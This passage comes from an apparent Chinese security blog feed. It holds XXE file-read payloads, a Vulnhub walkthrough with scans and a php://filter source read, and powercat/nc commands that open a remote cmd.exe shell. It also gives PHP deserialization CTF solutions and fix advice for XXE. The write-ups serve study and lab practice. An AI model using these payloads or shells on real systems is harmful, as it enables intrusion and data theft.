die(&#x27;error&#x27;);&#125;if(isset($xmlfile))&#123;    $dom = new DOMDocument();    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);&#125;highlight_file(__FILE__);    </span><br></pre></td></tr></table></figure><h3 id="3-5-2-修改-Content-Type类型"><a href="#3-5-2-修改-Content-Type类型" class="headerlink" title="3.5.2 修改 Content-Type类型"></a>3.5.2 修改 Content-Type类型</h3><p>一般对于web服务来说，最常见的数据格式都是XML和JSON。尽管web服务可能在编程时只使用其中一种格式，但服务器却可以接受开发人员并没有预料到的其他数据格式，这就有可能会导致JSON节点受到XXE（XML外部实体）攻击。</p><p><a href="http://web.jarvisoj.com:9882/">题目链接</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/01/MTmdcGnZlHxuNwi.png" alt="image-20210430104340700"></p><h3 id="3-5-3-引入本地-dtd-文件"><a href="#3-5-3-引入本地-dtd-文件" class="headerlink" title="3.5.3  引入本地 dtd 文件"></a>3.5.3  引入本地 dtd 文件</h3><p><a href="https://bnv.web.ctfcompetition.com/">题目链接</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">message</span> [<span class="meta">&lt;!ELEMENT <span class="meta-keyword">message</span> <span class="meta-keyword">ANY</span>&gt;</span>]&gt;</span><span class="tag">&lt;<span class="name">message</span>&gt;</span>1234010123502402340<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;&lt;!DOCTYPE message [&lt;!ENTITY % remote SYSTEM <span class="string">&quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;</span>&gt;&lt;!ENTITY % file SYSTEM <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;&lt;!ENTITY % ISOamso <span class="string">&#x27;&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;file://hhhhhhhh/?&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;&amp;#x25;eval;&amp;#x25;send;&#x27;</span>&gt; %remote;]&gt;&lt;message&gt;1234&lt;/message&gt;</span><br></pre></td></tr></table></figure><p>Exploiting XXE to retrieve data by repurposing a local DTD[2]</p><p>这个 payload 主要是利用 错误信息来打印目标文件的内容，重新定义了 <code>docbookx.dtd</code> （一般有 Gnome 就有它）里面的 <code>ISOamso</code>。我们提交了这个 payload 之后，当导入本地的 DTD 文件时，会优先执行我们定义的 <code>ISOamso</code>，因此可以达成任意文件读取。</p><h3 id="3-5-4-Vulnhub"><a href="#3-5-4-Vulnhub" class="headerlink" title="3.5.4 Vulnhub"></a>3.5.4 Vulnhub</h3><p><a href="https://www.vulnhub.com/">Vulnhub</a></p><p>确定 IP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali:nmap -sS 192.168.158.0/24nmap -sV -p- 192.168.158.121</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/01/8g31avFJlDqxnAZ.png" alt="image-20210501191238334"></p><p>目录扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.158.121</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *Allow: /User-Agent: *Disallow: /xxe/*Disallow: /admin.php</span><br></pre></td></tr></table></figure><p>XXE</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY test SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;test;&lt;/name&gt;&lt;password&gt;1&lt;/password&gt;&lt;/root&gt;</span><br></pre></td></tr></table></figure><p>admin.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY test SYSTEM &quot;php://filter/read=convert.base64-encode/resource=admin.php&quot;&gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;test;&lt;/name&gt;&lt;password&gt;1&lt;/password&gt;&lt;/root&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php   session_start();?&gt;&lt;html lang = &quot;en&quot;&gt;      &lt;head&gt;      &lt;title&gt;admin&lt;/title&gt;      &lt;link href = &quot;css/bootstrap.min.css&quot; rel = &quot;stylesheet&quot;&gt;            &lt;style&gt;         body &#123;            padding-top: 40px;            padding-bottom: 40px;            background-color: #ADABAB;         &#125;                  .form-signin &#123;            max-width: 330px;            padding: 15px;            margin: 0 auto;            color: #017572;         &#125;                  .form-signin .form-signin-heading,         .form-signin .checkbox &#123;            margin-bottom: 10px;         &#125;                  .form-signin .checkbox &#123;            font-weight: normal;         &#125;                  .form-signin .form-control &#123;            position: relative;            height: auto;            -webkit-box-sizing: border-box;            -moz-box-sizing: border-box;            box-sizing: border-box;            padding: 10px;            font-size: 16px;         &#125;                  .form-signin .form-control:focus &#123;            z-index: 2;         &#125;                  .form-signin input[type=&quot;email&quot;] &#123;            margin-bottom: -1px;            border-bottom-right-radius: 0;            border-bottom-left-radius: 0;            border-color:#017572;         &#125;                  .form-signin input[type=&quot;password&quot;] &#123;            margin-bottom: 10px;            border-top-left-radius: 0;            border-top-right-radius: 0;            border-color:#017572;         &#125;                  h2&#123;            text-align: center;            color: #017572;         &#125;      &lt;/style&gt;         &lt;/head&gt;   &lt;body&gt;            &lt;h2&gt;Enter Username and Password&lt;/h2&gt;       &lt;div class = &quot;container form-signin&quot;&gt;                  &lt;?php            $msg = &#x27;&#x27;;            if (isset($_POST[&#x27;login&#x27;]) &amp;&amp; !empty($_POST[&#x27;username&#x27;])                &amp;&amp; !empty($_POST[&#x27;password&#x27;])) &#123;               if ($_POST[&#x27;username&#x27;] == &#x27;administhebest&#x27; &amp;&amp;                   md5($_POST[&#x27;password&#x27;]) == &#x27;e6e061838856bf47e1de730719fb2609&#x27;) &#123;                  $_SESSION[&#x27;valid&#x27;] = true;                  $_SESSION[&#x27;timeout&#x27;] = time();                  $_SESSION[&#x27;username&#x27;] = &#x27;administhebest&#x27;;                                  echo &quot;You have entered valid use name and password &lt;br /&gt;&quot;;$flag = &quot;Here is the &lt;a style=&#x27;color:FF0000;&#x27; href=&#x27;/flagmeout.php&#x27;&gt;Flag&lt;/a&gt;&quot;;echo $flag;               &#125;else &#123;                  $msg = &#x27;Maybe Later&#x27;;               &#125;            &#125;         ?&gt;      &lt;/div&gt; &lt;!-- W00t/W00t --&gt;            &lt;div class = &quot;container&quot;&gt;               &lt;form class = &quot;form-signin&quot; role = &quot;form&quot;             action = &quot;&lt;?php echo htmlspecialchars($_SERVER[&#x27;PHP_SELF&#x27;]);             ?&gt;&quot; method = &quot;post&quot;&gt;            &lt;h4 class = &quot;form-signin-heading&quot;&gt;&lt;?php echo $msg; ?&gt;&lt;/h4&gt;            &lt;input type = &quot;text&quot; class = &quot;form-control&quot;                name = &quot;username&quot;                required autofocus&gt;&lt;/br&gt;            &lt;input type = &quot;password&quot; class = &quot;form-control&quot;               name = &quot;password&quot; required&gt;            &lt;button class = &quot;btn btn-lg btn-primary btn-block&quot; type = &quot;submit&quot;                name = &quot;login&quot;&gt;Login&lt;/button&gt;         &lt;/form&gt;         Click here to clean &lt;a href = &quot;adminlog.php&quot; tite = &quot;Logout&quot;&gt;Session.               &lt;/div&gt;          &lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="3-6-修复建议"><a href="#3-6-修复建议" class="headerlink" title="3.6 修复建议"></a>3.6 修复建议</h2><p>（1）禁止使用外部实体，例如 <code>libxml_disable_entity_loader(true)</code></p><p>（2）过滤用户提交的XML数据，防止出现非法内容，如关键词：&lt;!DOCTYPE和&lt;!ENTITY或者SYSTEM和PUBLIC等</p><p>（3）检查所使用的底层XML解析库，默认禁止外部实体的解析</p><p>（4）若使用第三方应用代码需要及时升级补丁</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP：libxml_disable_entity_loader(true);JAVA:DocumentBuilderFactorydbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);Python：from lxml import etreexmlData= etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/walkwaters/p/12057566.html">nmap</a></p><h2 id="3-7-参考"><a href="#3-7-参考" class="headerlink" title="3.7 参考"></a>3.7 参考</h2><p>XXE : <a href="https://xz.aliyun.com/t/3357#toc-17">https://xz.aliyun.com/t/3357#toc-17</a></p><p>XXE : <a href="https://mature-sec.com/post/xxe%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">https://mature-sec.com/post/xxe%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p><p>PHP-dom : <a href="https://www.runoob.com/php/php-xml-parser-expat.html">https://www.runoob.com/php/php-xml-parser-expat.html</a></p><p>菜鸟教程~XML： <a href="https://www.runoob.com/xml/xml-tutorial.html">https://www.runoob.com/xml/xml-tutorial.html</a></p><p>菜鸟教程~DTD： <a href="https://www.runoob.com/dtd/dtd-tutorial.html">https://www.runoob.com/dtd/dtd-tutorial.html</a></p><p><a href="https://www.cnblogs.com/20175211lyz/p/11413335.html">https://www.cnblogs.com/20175211lyz/p/11413335.html</a></p><p><a href="https://www.runoob.com/schema/schema-tutorial.html">XML Schema 菜鸟教程</a></p><p><a href="https://www.freebuf.com/column/156863.html">使用 XML Schema 攻击</a></p><p><a href="http://www.anquanke.com/post/id/87481">XSLT 攻击 (xxe)</a></p><p><a href="https://www.cnblogs.com/AtesetEnginner/p/11261653.html">https://www.cnblogs.com/AtesetEnginner/p/11261653.html</a></p><p><img src="https://img2020.cnblogs.com/blog/2265061/202102/2265061-20210204114932441-1593681207.png" alt="img"></p><p>Windows上的powercat正向连接Kali上的nc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali:192.168.158.111 nc -lvvp 4444 win-10:192.168.158.110 powercat -c 192.168.158.111 -p 4444 -e cmd.exe</span><br></pre></td></tr></table></figure><p>kali上的nc反向链接到windows上的powercat</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali:192.168.158.111 nc -vv 192.168.158.110 4444 win-10:192.168.158.110 powercat -l -p 4444 -e cmd.exe</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;一、XML&quot;&gt;&lt;a href=&quot;#一、XML&quot; class=&quot;headerlink&quot; title=&quot;一、XML&quot;&gt;&lt;/a&gt;一、XML&lt;/h1&gt;&lt;h2 id=&quot;1-1-简介&quot;&gt;&lt;a href=&quot;#1-1-简介&quot; class=&quot;headerlink&quot; title=&quot;1.1 简介&quot;&gt;&lt;/a&gt;1.1 简介&lt;/h2&gt;&lt;p&gt;XML是一种用于标记电子文件使其具有结构性的 &lt;strong&gt;可扩展标记语言（EXtensible Markup Language）&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://baike.baidu.com/item/XML&quot;&gt;XML&lt;/a&gt;的前身是 &lt;a href=&quot;https://baike.baidu.com/item/%E6%A0%87%E5%87%86%E9%80%9A%E7%94%A8%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80&quot;&gt;标准通用标记语言 &lt;/a&gt;，为了使标准通用标记语言显得用户友好，XML重新定义了标准通用标记语言的一些内部值和参数，去掉了大量的很少用到的功能，这些繁杂的功能使得标准通用标记语言在设计网站时显得复杂化。XML保留了标准通用标记语言的结构化功能，这样就使得网站设计者可以定义自己的文档类型，XML同时也推出一种新型文档类型，使得开发者也可以不必定义文档类型。&lt;/p&gt;</summary>
    
    
    
    <category term="Web漏洞" scheme="https://xizhi-future.github.io/categories/Web%E6%BC%8F%E6%B4%9E/"/>
    
    
    <category term="Web" scheme="https://xizhi-future.github.io/tags/Web/"/>
    
    <category term="漏洞" scheme="https://xizhi-future.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>NUCTF</title>
    <link href="https://xizhi-future.github.io/2021/06/24/NUCTF/"/>
    <id>https://xizhi-future.github.io/2021/06/24/NUCTF/</id>
    <published>2021-06-24T11:24:20.000Z</published>
    <updated>2021-07-12T04:40:08.086Z</updated>
    
    <content type="html"><![CDATA[<p>概述：主要考点 — 序列化与反序列化字符逃逸</p><span id="more"></span><h1 id="NUCTF"><a href="#NUCTF" class="headerlink" title="NUCTF"></a>NUCTF</h1><h2 id="1-EasyUnser"><a href="#1-EasyUnser" class="headerlink" title="1 EasyUnser"></a>1 EasyUnser</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="keyword">include_once</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);<span class="comment">// Security filtering function</span></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">return</span> str_replace(<span class="string">&#x27;secure&#x27;</span>, <span class="string">&#x27;secured&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">Hacker</span></span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;margin&#x27;</span>;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;margin123&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="variable">$h</span> = <span class="keyword">new</span> Hacker();</span><br><span class="line">   <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">       <span class="comment">// Security filtering</span></span><br><span class="line">       <span class="variable">$h</span>-&gt;username = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">       <span class="variable">$c</span> = unserialize(filter(serialize(<span class="variable">$h</span>)));</span><br><span class="line">       <span class="keyword">if</span> (<span class="variable">$c</span>-&gt;password === <span class="string">&#x27;hacker&#x27;</span>)&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p><strong>分析：</strong></p><blockquote><ol><li>POST 传入参数 username 和 password</li><li>题目初始化 <code>public $password = &#39;margin123&#39;;</code> ，而要想获取 flag 必须使 password 为 hacker</li><li>根据 PHP 反序列化时遇到 <code>;&#125;</code> 即反序列化结束，我们传入 username 为 <code>margin&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;</code> ，希望原本初始化的 password 的值 <code>margin123</code> 失效（被顶出去）</li></ol></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Hacker</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;margin&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;margin123&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$h</span> = <span class="keyword">new</span> Hacker();</span><br><span class="line">    <span class="keyword">echo</span> serialize(<span class="variable">$h</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到 O:6:&quot;Hacker&quot;:2:&#123;s:8:&quot;username&quot;;s:37:&quot;margin&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:8:&quot;password&quot;;s:9:&quot;margin123&quot;;&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">Hacker</span></span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;margin&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;</span>;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;margin123&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="variable">$h</span> = <span class="keyword">new</span> Hacker();</span><br><span class="line">   print_r(unserialize(<span class="variable">$h</span>);</span><br></pre></td></tr></table></figure><blockquote><ol start="4"><li>如果我们将上面的得到的内容进行 <code>反序列化输出</code>，结果将会报错；这是因为 <code>s:37:&quot;margin&quot;;</code> 这里按道理应该是 <code>s:6:&quot;margin&quot;;</code>，但由于我们需要按照上面的方法将后面的 <code>&quot;;s:8:&quot;password&quot;;s:9:&quot;margin123&quot;;&#125;</code> 挤掉，因此实际上传入的长度是37，所以我们需要想办法将这37个长度补齐，还需要多传入 31个长度；</li><li>题目中的 filter 函数即是将 <code>secuer 替换为 secured</code> ，一个 secured 比 secure 多一个长度，那么 31个 secure 就会多出 31个长度，从而导致字符增加</li></ol></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Hacker</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;securesecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecure&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;margin123&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$h</span> = <span class="keyword">new</span> Hacker();</span><br><span class="line">    <span class="keyword">echo</span> serialize(<span class="variable">$h</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出 O:6:&quot;Hacker&quot;:2:&#123;s:8:&quot;username&quot;;s:217:&quot;securesecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecure&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:8:&quot;password&quot;;s:9:&quot;margin123&quot;;&#125;</span></span><br><span class="line"></span><br><span class="line">实际上username的长度是<span class="number">186</span>，但是被替换之后成为</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 被 filter 替换之后变成 O:6:&quot;Hacker&quot;:2:&#123;s:8:&quot;username&quot;;s:217:&quot;securedsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecured&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:8:&quot;password&quot;;s:9:&quot;margin123&quot;;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这样就补齐了</span></span><br></pre></td></tr></table></figure><p><strong>payload：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post传参：   username=securesecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecure%<span class="number">22</span>;s:<span class="number">8</span>:%<span class="number">22</span>password%<span class="number">22</span>;s:<span class="number">6</span>:%<span class="number">22</span>hacker%<span class="number">22</span>;&#125;&amp;password=<span class="number">123</span></span><br></pre></td></tr></table></figure><h2 id="2-Just-Serizlize"><a href="#2-Just-Serizlize" class="headerlink" title="2 Just Serizlize"></a>2 Just Serizlize</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;<span class="comment">// $flag = &quot;DASCTF&#123;xxxxx&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;obj&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="variable">$obj</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;?&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = @unserialize(<span class="variable">$obj</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$obj</span>-&gt;flag === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$obj</span>-&gt;flag = <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$obj</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$k</span> !== <span class="string">&quot;flag&quot;</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$v</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>分析：</strong></p><blockquote><ol><li>GET 传参 obj；</li><li>传入参数不得含有 flag；对象中包含 flag 字段时，才会传入 $flag 的内容；但当字段名不为 flag 时，才能显示出 $flag；</li><li>hex 编码绕过 <code>if ($k !== &quot;flag&quot;) </code> ，把 s 换成 S；</li><li>表示字符类型的s大写时, 会被当成16进制解析, 定义一个变量取 flag 变量的地址即可得到 flag 变量的值；</li></ol></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$obj</span> = (<span class="keyword">object</span>)[<span class="string">&#x27;flag&#x27;</span>=&gt;<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line">  <span class="variable">$obj</span>-&gt;Hh0 = &amp;<span class="variable">$obj</span>-&gt;flag;</span><br><span class="line">  <span class="keyword">echo</span> serialize(<span class="variable">$obj</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到 O:8:&quot;stdClass&quot;:2:&#123;s:4:&quot;flag&quot;;s:4:&quot;flag&quot;;s:3:&quot;Hh0&quot;;R:2;&#125;</span></span><br></pre></td></tr></table></figure><p><strong>payload：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?obj=O:<span class="number">8</span>:<span class="string">&quot;stdClass&quot;</span>:<span class="number">2</span>:&#123;S:<span class="number">4</span>:<span class="string">&quot;\66\6c\61\67&quot;</span>;S:<span class="number">4</span>:<span class="string">&quot;\66\6c\61\67&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;Hh0&quot;</span>;R:<span class="number">2</span>;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?obj=O:<span class="number">8</span>:<span class="string">&quot;stdClass&quot;</span>:<span class="number">2</span>:&#123;S:<span class="number">4</span>:<span class="string">&quot;\66\6c\61\67&quot;</span>;S:<span class="number">4</span>:<span class="string">&quot;\66\6c\61\67&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;asd&quot;</span>;R:<span class="number">2</span>;&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;概述：主要考点 — 序列化与反序列化字符逃逸&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://xizhi-future.github.io/categories/CTF/"/>
    
    
    <category term="CTF" scheme="https://xizhi-future.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>文件包含、读取、下载漏洞</title>
    <link href="https://xizhi-future.github.io/2021/06/06/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E3%80%81%E8%AF%BB%E5%8F%96%E3%80%81%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"/>
    <id>https://xizhi-future.github.io/2021/06/06/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E3%80%81%E8%AF%BB%E5%8F%96%E3%80%81%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-06-06T14:42:17.000Z</published>
    <updated>2021-07-09T07:26:47.102Z</updated>
    
    <content type="html"><![CDATA[<p>概述：有关文件的常见漏洞：包括文件包含漏洞、文件读取漏洞、文件下载漏洞。</p><span id="more"></span><h1 id="一、文件包含漏洞–文件被解析"><a href="#一、文件包含漏洞–文件被解析" class="headerlink" title="一、文件包含漏洞–文件被解析"></a>一、文件包含漏洞–文件被解析</h1><p>就是将所包含的文件当作脚本去执行</p><p><strong>PHP当中包含函数</strong></p><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>include()</td><td>文件包含失败时，会产生 <code>警告</code>，但脚本 <code>将继续执行</code></td></tr><tr><td>include_once()</td><td>作用与include()相同，但文件只会被包含一次</td></tr><tr><td>require()</td><td>文件包含失败时，会产生 <code>错误</code>， <code>直接结束脚本执行</code></td></tr><tr><td>require_once()</td><td>作用与require()相同，但文件只会被包含一次</td></tr><tr><td><strong>成因</strong></td><td></td></tr></tbody></table><p>1.Web应用实现了 <code>动态包含</code><br>2.动态包含的文件路径参数，<code>客户端可控</code></p><p><strong>相关配置</strong></p><p>本地文件包含 (LFI)：可以读取与打开本地文件<br>远程文件包含 (RFI)(HTTP,FTP,PHP伪协议)：可以远程加载文件</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php.ini文件：</span><br><span class="line">本地：allow_url_fopen<span class="operator">=</span><span class="keyword">On</span><span 